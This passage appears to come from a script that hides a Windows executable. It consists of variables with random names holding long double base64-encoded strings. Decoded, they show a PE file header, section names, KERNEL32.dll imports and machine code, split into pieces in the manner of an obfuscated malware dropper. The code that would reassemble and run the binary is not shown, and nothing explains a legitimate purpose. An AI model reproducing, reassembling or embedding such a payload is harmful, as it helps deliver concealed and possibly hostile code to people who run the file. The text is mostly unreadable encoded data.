pNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 izdNRwcJTeFo = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVFFQkFRRUJBUUVCQVFFQkFRRUJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 YGBHxOaXgIoKdqWzNQGNHtqUEMzos = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRVBCU1VQSXdvQkhRQURj"
 gkPIowzPeMzZhIlu = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 XgBQyggOVzqWSVBIMaefHTOEuQxOQwtSFrvMUrNTrUEmiUZJUAtcTscKrDnJrBZyw = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 RseODqsHZOcDsHSeQJsCp = "QUFBQUFBQUF1ZEdWNGRHSnpjd0FBQVFBQUVBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUNnQUFEZ0xuUmxlSFFBQUFDUGdRQUFBQkFCQUFDQ0FBQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUlBQUFZQzV5WkdGMFlRQUFQUzRBQUFDZ0FRQUFNQUFBQUlZQUFBQUFBQUFBQUFBQUFBQUFBRUFBQUVBdVpHRjBZUUFBQVBBSUFBQUEwQUVBQUFJQUFBQzJBQUFBQUFBQUFBQUFBQUFBQUFCQUFBREFMbkJrWVhSaEFBQklJUUFBQU9BQkFBQWlBQUFBdUFBQUFBQUFBQUFBQUFBQUFBQUFRQUFBUUM1cFpHRjBZUUFBR1E4QUFBQVFBZ0FBRUFBQUFOb0FBQUFBQUFBQUFBQUFBQUFBQUVBQUFFQXViWE4yWTJwdFl4SUJBQUFBSUFJQUFBSUFBQURxQUFBQUFBQUFBQUFBQUFBQUFBQkFBQURBTGpBd1kyWm5BQUIxQVFBQUFEQUNBQUFDQUFBQTdBQUFBQUFBQUFBQUFBQUFBQUFBUUFBQVFDNXljM0pqQUFBQVBBUUFBQUJBQWdBQUJnQUFBTzRBQUFBQUFBQUFBQUFBQUFBQUFFQUFBRUF1Y21Wc2IyTUFBSFVDQUFBQVVBSUFBQVFBQUFEMEFBQUFBQUFBQUFBQUFBQUFBQUJBQUFCQ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 xdBS = "ek16TXpNek16TXpNek16TXpNekVpSlRDUUlTSVBzS0VpRGZDUXdBSFVFTXNEcmNFaUxSQ1F3U0lrRUpFaUxCQ1FQdHdBOVRWb0FBSFFFTXNEclZVaUxCQ1JJWTBBOFNJc01KRWdEeUVpTHdVaUpSQ1FRU0l0RUpCQklpVVFrQ0VpTFJDUUlnVGhRUlFBQWRBUXl3T3NqU0l0RUpBaElnOEFZU0lsRUpCaElpMFFrR0ErM0FEMExBZ0FBZEFReXdPc0NzQUZJZzhRb3c4ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek1aVWlMQkNVd0FBQUF3OHpNek16TXpFaUQ3RWpvNHRqLy80WEFkUVF5d090TTZMRGEvLzlJaTBBSVNJbEVKQ2hJaTBRa0tFaUpSQ1F3U0kwTnNKOEFBRFBBU0l0VUpERHdTQSt4RVVpSlJDUWdTSU44SkNBQWRCSklpMFFrSUVnNVJDUW9kUVN3QWVzRTY4UXl3RWlEeEVqRHpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek1TSVBzS09oaTJQLy9oY0IwQitnZzJ2Ly82eExvS2RuLy80WEFkQVF5d09zSDZEYlkvLyt3QVVpRHhDakR6TXpNek16TXpNek16TXpNek16TXpNek16RWlEN0NnenllakIxLy8vRDdiQWhjQjFCRExBNndLd0FVaUR4Q2pEek16TXpNek16TXpNek16TXpNek16TXpNekVpRDdDam9pZGYvL3crMndJWEFkUVF5d09zWDZETFkvLzhQdHNDRndIVUo2Ty9YLy84eXdPc0NzQUZJZzhRb3c4ek16TXpNek16TXpNek16"
 gAeijdYgfomMRoOeMejpaoIYRXooMsJRSX = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 TpxkVXqMUpsPDfXyHhBcXTCkqGNpjIL = "UWNtOWpRV1JrY21WemN3QUFTMFZTVGtWTU16SXVaR3hzQUFBOEFHMWxiV053ZVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 PIkxRHBZXbWiGvPkUBnCkhaGEtGOaTVcZkOejmvrTsocw = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 VEYGvieIXwNQYBkFyYgJLRPRfUMBOcvwKNCsAFLihTKZJAAEf = "VFZxUUFBTUFBQUFFQUFBQS8vOEFBTGdBQUFBQUFBQUFRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUErQUFBQUE0ZnVnNEF0QW5OSWJnQlRNMGhWR2hwY3lCd2NtOW5jbUZ0SUdOaGJtNXZkQ0JpWlNCeWRXNGdhVzRnUkU5VElHMXZaR1V1RFEwS0pBQUFBQUFBQUFDUmZPckIxUjJFa3RVZGhKTFZIWVNTYW1HRms5WWRoSkpxWVlHVHpSMkVrbXBoZ0pQZUhZU1NhbUdIazlZZGhKSUdiNFdUMFIyRWt0VWRoWktkSFlTU0RXQ0JrOVFkaEpJTllIdVMxQjJFa2cxZ2hwUFVIWVNTVW1samFOVWRoSklBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQlFSUUFBWklZS0FPSWJOR1FBQUFBQUFBQUFBUEFBSWdBTEFnNGpBSUlBQUFCNkFBQUFBQUFBYkJJQkFBQVFBQUFBQUFCQUFRQUFBQUFRQUFBQUFnQUFCZ0FBQUFBQUFBQUdBQUFBQUFBQUFBQmdBZ0FBQkFBQUFBQUFBQU1BWUlFQUFCQUFBQUFBQUFBUUFBQUFBQUFBQUFBUUFBQUFBQUFBRUFBQUFBQUFBQUFBQUFBUUFBQUFBQUFBQUFBQUFBQ3dFd0lBVUFBQUFBQkFBZ0E4QkFBQUFPQUJBRFFkQUFBQUFBQUFBQUFBQUFCUUFnQnNBQUFBNExnQkFEZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQmd0d0VBUUFFQUFBQUFBQUFBQUFBQUFCQUNBTEFEQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 RSEcHbLzGYqWPqwV = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 gyLPgEnLTxnbxyZNvFPsslE = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRkFqQVVBQkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 gNQUkayMQCoqhaCxkMsR = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 TXIzOYq = "L3lVd3RnQUEveVhxdHdBQS95WGN0d0FBL3lYT3R3QUEveVhBdHdBQS95V3l0d0FBL3lXa3R3QUEveVdXdHdBQS95V0l0d0FBL3lWNnR3QUEveVZzdHdBQS95VmV0d0FBL3lWUXR3QUEveVZDdHdBQS95VTB0d0FBL3lVbXR3QUEveVVZdHdBQS95VUt0d0FBL3lYOHRnQUEveVh1dGdBQS95WGd0Z0FBL3lYU3RnQUEveVhFdGdBQS95VzJ0Z0FBL3lXb3RnQUEveVdhdGdBQS95V010Z0FBL3lVMnRnQUEveVY0dGdBQS95Vkt0d0FBL3lVc3RnQUEveVV1dGdBQS95VXd0Z0FBL3lVeXRnQUEveVUwdGdBQS95VTJ0Z0FBL3lVNHRnQUEveVU2dGdBQS95V0V0QUFBL3lYK3N3QUEveVVBdEFBQS95VUN0QUFBL3lVRXRBQUEveVVHdEFBQS95VUl0QUFBL3lVS3RBQUEveVVNdEFBQS95V090QUFBL3lXQXRBQUEveVZ5dEFBQS95Vmt0QUFBL3lWV3RBQUEveVZJdEFBQS95VTZ0QUFBL3lVc3RBQUEveVdXc3dBQS95VVF0QUFBL3lVQ3RBQUEveVgwc3dBQS95WG1zd0FBL3lYWXN3QUEveVhLc3dBQS95Vzhzd0FBL3lXdXN3QUF6TXpNek16TXNBSER6TXpNek16TXpNek16TXpNekxBQnc4ek16TXpNek16TXpNek16TXl3QWNQTXpNek16TXpNek16TXpNek1pRXdrQ0xBQnc4ek16TXpNek16TXpJaE1KQWl3QWNQTXpNek16TXpNek13endNUC9KWmUwQUFETXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 yLMpvyTCnJZPDgwQBPHkXbuEMkmQiFzmxyCqwxKuVeIqBQZscaBLQRHRcOXO = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 sPqnjMUPkXraNiYdmKDHaFHQOCaeGjVuwtTlZkwbEWSWsMqfoiCRhNjPSefNoKgCczlU = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 OGqredxqtvJndLDggszIxTZoq = "Q1FZU0l0RUpCaElnK0FHU0lQNEJnK0Zpd0FBQU1jRitYWUFBQU1BQUFDTEJmZDJBQUNEeUFpSkJlNTJBQUM0QkFBQUFFaHJ3QUtMUkFRd2crQWdoY0IwWHNjRnpIWUFBQVVBQUFDTEJjcDJBQUNEeUNDSkJjRjJBQUM0QkFBQUFFaHJ3QUtMUkFRd0pRQUFBOUE5QUFBRDBIVXNTSXRFSkJoSUplQUFBQUJJUGVBQUFBQjFHY2NGaDNZQUFBWUFBQUNMQllWMkFBQ0R5RUNKQlh4MkFBQXp3RWlMVENSQVNEUE02TnEzLy85SWc4UlFXOFBNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNU0lQc0dJTTlsWFVBQUFCMENjY0VKQUVBQUFEckI4Y0VKQUFBQUFDTEJDUklnOFFZdzh6TXpNek16TXpNek16TS95V1N0Z0FBL3lXRXRnQUEveVYydGdBQS95Vm90Z0FBL3lWYXRnQUEveVZNdGdBQS95VSt0Z0FB"
